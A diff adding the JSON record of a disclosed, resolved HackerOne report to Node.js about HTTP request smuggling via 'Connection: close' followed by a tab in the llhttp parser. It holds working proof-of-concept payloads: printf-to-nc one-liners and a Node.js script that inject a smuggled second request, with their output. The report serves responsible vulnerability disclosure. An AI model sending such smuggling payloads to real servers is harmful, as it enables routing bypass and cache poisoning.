@@ -1,0 +1,124 @@
+{
+  "id": 3723248,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzIzMjQ4",
+  "url": "https://hackerone.com/reports/3723248",
+  "title": "HTTP Request Smuggling via Connection: close<TAB> in Node.js llhttp parser",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-05-09T16:24:33.772Z",
+  "submitted_at": "2026-05-09T16:24:34.649Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "nadav0077",
+    "url": "/nadav0077",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ud8ksag3eocknmziofcglo75d3ui/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22984,
+    "url": "https://hackerone.com/nodejs",
+    "handle": "nodejs",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js",
+      "twitter_handle": "nodejs",
+      "website": "https://nodejs.org",
+      "about": "The Node.js JavaScript Runtime"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-07-31T15:27:19.982Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-07-01T15:27:16.986Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** Node's HTTP server ignores `Connection: close` when the token is followed by a tab character, so bytes after the request body can be parsed as a second request on the same connection.\n\n**Description:** I found a parsing difference in Node's HTTP/1 handling for the `Connection` header.\n\n`Connection: close` works as expected: after the request body, Node does not accept another request on that connection. `Connection: close ` with a trailing space also works as expected.\n\nBut `Connection: close\\t` behaves differently. Node does not apply the `close` connection option, keeps the connection alive, and parses the bytes immediately after the first request body as another HTTP request. In my test, a single TCP write containing a POST followed by `GET /smuggled` results in the application receiving two request events.\n\nThis looks like it comes from llhttp's `Connection` token parser. After recognizing `close`, the parser accepts comma, space, CR, and LF, but not HTAB. The HTAB path falls back in a way that drops the pending `CONNECTION_CLOSE` state.\n\nThis looks like it comes from llhttp’s `Connection` token parser. After recognizing `close`, the parser accepts comma, space, CR, and LF, but not HTAB. The HTAB path falls back in a way that drops the pending `CONNECTION_CLOSE` state.\n\nAlthough the root cause appears to be in llhttp, this report is for Node.js because the behavior is reachable through Node's default `http.createServer()` API with attacker-controlled inbound network data.\n\nRelevant code:\n\n- https://github.com/nodejs/llhttp/blob/main/src/llhttp/http.ts#L794-L826\n- https://github.com/nodejs/llhttp/blob/main/src/native/http.c#L156-L169\n\n## Steps To Reproduce\n\nI reproduced this with Node.js v24.13.1, v24.15.0, and v26.1.0 using default `http.createServer()` settings.\n\n### Manual Reproduction Without Script\n\nTerminal 1: start a default Node HTTP server.\n\n```bash\nnode -e \"require('http').createServer((req,res)=>{console.log('request:', req.url); req.resume(); res.end('ok');}).listen(8080,'127.0.0.1',()=>console.log('listening'))\"\n```\n\nTerminal 2: send the control case with normal `Connection: close`.\n\n```bash\nprintf 'POST /first HTTP/1.1\\r\\nHost: victim\\r\\nContent-Length: 4\\r\\nConnection: close\\r\\n\\r\\n1234GET /smuggled HTTP/1.1\\r\\nHost: victim\\r\\n\\r\\n' | nc -w 2 127.0.0.1 8080\n```\n\nExpected server output in Terminal 1:\n\n```text\nrequest: /first\n```\n\nTerminal 2: send the second control case with `Connection: close ` and a trailing space.\n\n```bash\nprintf 'POST /first HTTP/1.1\\r\\nHost: victim\\r\\nContent-Length: 4\\r\\nConnection: close \\r\\n\\r\\n1234GET /smuggled HTTP/1.1\\r\\nHost: victim\\r\\n\\r\\n' | nc -w 2 127.0.0.1 8080\n```\n\nExpected server output in Terminal 1:\n\n```text\nrequest: /first\n```\n\nTerminal 2: send the vulnerable case with a tab after `close`.\n\n```bash\nprintf 'POST /first HTTP/1.1\\r\\nHost: victim\\r\\nContent-Length: 4\\r\\nConnection: close\\t\\r\\n\\r\\n1234GET /smuggled HTTP/1.1\\r\\nHost: victim\\r\\n\\r\\n' | nc -w 2 127.0.0.1 8080\n```\n\nUnexpected server output in Terminal 1:\n\n```text\nrequest: /first\nrequest: /smuggled\n```\n\nThe only difference is `Connection: close` versus `Connection: close\\t`. I tested this manual reproduction with WSL `nc` against Node.js v24.15.0 and v26.1.0.\n\n### Optional Script Reproduction\n\nSave this as `node_connection_close_tab_e2e.js`.\n\n```js\nconst http = require('http');\nconst net = require('net');\n\nconst cases = [\n  ['normal-close', 'Connection: close\\r\\n'],\n  ['space-after-close', 'Connection: close \\r\\n'],\n  ['tab-after-close', 'Connection: close\\t\\r\\n'],\n];\n\nfunction sendRaw(port, connectionLine, expectedResponses) {\n  return new Promise((resolve) => {\n    const socket = net.createConnection({ port, host: '127.0.0.1' });\n    let data = '';\n    let settled = false;\n\n    function finish() {\n      if (settled) return;\n      settled = true;\n      socket.destroy();\n      resolve(data);\n    }\n\n    socket.on('data', (chunk) => {\n      data += chunk.toString('latin1');\n      const count = [...data.matchAll(/HTTP\\/1\\.1 \\d+/g)].length;\n      if (count >= expectedResponses) {\n        finish();\n      }\n    });\n    socket.on('close', finish);\n    socket.on('connect', () => {\n      socket.write(\n        'POST /first HTTP/1.1\\r\\n' +\n        'Host: victim\\r\\n' +\n        'Content-Length: 4\\r\\n' +\n        connectionLine +\n        '\\r\\n' +\n        '1234' +\n        'GET /smuggled HTTP/1.1\\r\\n' +\n        'Host: victim\\r\\n' +\n        '\\r\\n',\n        'latin1',\n      );\n    });\n  });\n}\n\nasync function runCase(name, connectionLine) {\n  const seen = [];\n  const server = http.createServer((req, res) => {\n    seen.push(req.url);\n    req.resume();\n    res.end('ok');\n  });\n\n  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));\n  const port = server.address().port;\n  const expectedResponses = name === 'tab-after-close' ? 2 : 1;\n  const response = await sendRaw(port, connectionLine, expectedResponses);\n  await new Promise((resolve) => server.close(resolve));\n\n  console.log(`CASE ${name}`);\n  console.log(`  seen=${JSON.stringify(seen)}`);\n  console.log(`  response_statuses=${JSON.stringify([...response.matchAll(/HTTP\\/1\\.1 (\\d+)/g)].map((m) => m[1]))}`);\n}\n\n(async () => {\n  for (const [name, connectionLine] of cases) {\n    await runCase(name, connectionLine);\n  }\n})().catch((err) => {\n  console.error(err);\n  process.exitCode = 1;\n});\n```\n\nRun it:\n\n```bash\nnode node_connection_close_tab_e2e.js\n```\n\nOutput:\n\n```text\nCASE normal-close\n  seen=[\"/first\"]\n  response_statuses=[\"200\"]\nCASE space-after-close\n  seen=[\"/first\"]\n  response_statuses=[\"200\"]\nCASE tab-after-close\n  seen=[\"/first\",\"/smuggled\"]\n  response_statuses=[\"200\",\"200\"]\n```\n\nThe only difference between the safe case and the unsafe case is the trailing tab after `close`.\n\n## Supporting Material/References\n\n- RFC 9110 defines optional whitespace as `SP / HTAB`: https://www.rfc-editor.org/rfc/rfc9110#section-5.6.3\n- RFC 9110 `Connection` header: https://www.rfc-editor.org/rfc/rfc9110#section-7.6.1\n\n## Impact\n\nA remote unauthenticated client can send one TCP payload that Node exposes to the application as two HTTP requests, even though the first request uses `Connection: close`. In other words, the attacker can inject an extra request into a connection that should have been closed after the first request.\n\nThis can break assumptions in servers, reverse proxies, and gateways that rely on `Connection: close` to delimit a connection after a request. In a multi-hop setup, a frontend or peer that treats `Connection: close<TAB>` as `Connection: close` can become desynchronized from Node, while Node continues parsing the attacker-controlled trailing bytes as a new request.\n\nThe practical impact is HTTP request smuggling / request queue desynchronization. Depending on deployment, this can lead to routing bypasses, cache poisoning, or the injected request being processed under connection-level assumptions that were intended only for the previous request. I have not assumed a specific proxy product or application authorization bug; the PoC demonstrates the underlying Node HTTP parser behavior needed for such chains.",
+  "weakness": {
+    "id": 86,
+    "name": "HTTP Request Smuggling"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-07-31T15:27:17.951Z",
+  "allow_singular_disclosure_after": -6942.006807366,
+  "singular_disclosure_allowed": true,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "medium",
+    "score": 5.8,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 666,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/nodejs/node",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
